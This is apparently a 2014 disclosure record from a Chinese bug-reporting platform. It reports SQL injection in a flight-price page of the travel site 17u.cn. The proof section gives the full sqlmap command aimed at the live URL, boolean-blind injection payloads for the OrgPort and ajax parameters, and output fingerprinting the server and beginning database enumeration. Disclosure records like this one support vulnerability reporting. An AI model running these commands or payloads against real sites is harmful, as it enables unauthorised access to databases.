wybug_detail:
漏洞详情 披露状态：   									2014-04-08：	细节已通知厂商并且等待厂商处理中									2014-04-08：	厂商已经确认，细节仅向厂商公开									2014-04-18：	细节向核心白帽子及相关领域专家公开									2014-04-28：	细节向普通白帽子公开									2014-05-08：	细节向实习白帽子公开									2014-05-23：	细节向公众公开  简要描述： SQL注入 详细说明：  http://www.17u.cn/flight/FlightPriceNew.aspx?ajax=GetPageData&OrgPort=CSX&DesPort=&Sort=&CurrPage=2 参数OrgPort可被注入   漏洞证明：  python sqlmap/sqlmap.py -u "http://www.17u.cn/flight/FlightPriceNew.aspx?ajax=GetPageData&OrgPort=CSX&DesPort=&Sort=&CurrPage=2" --dbms="microsoft sql server" --dbs
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ajax    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ajax=GetPageData AND 7825=7825-- Wmnj&OrgPort=CSX&DesPort=&Sort=&CurrPage=2Place: GETParameter: OrgPort    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ajax=GetPageData&OrgPort=CSX' AND 7394=7394 AND 'KNGc'='KNGc&DesPort=&Sort=&CurrPage=2there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: OrgPort, type: Single quoted string (default)[1] place: GET, parameter: ajax, type: Unescaped numeric[q] Quit> 0[10:42:00] [INFO] testing Microsoft SQL Server[10:42:00] [INFO] confirming Microsoft SQL Server[10:42:00] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2008[10:42:00] [INFO] fetching database names[10:42:00] [INFO] fetching number of databases[10:42:00] [WARNING] running in a single-thread mode.
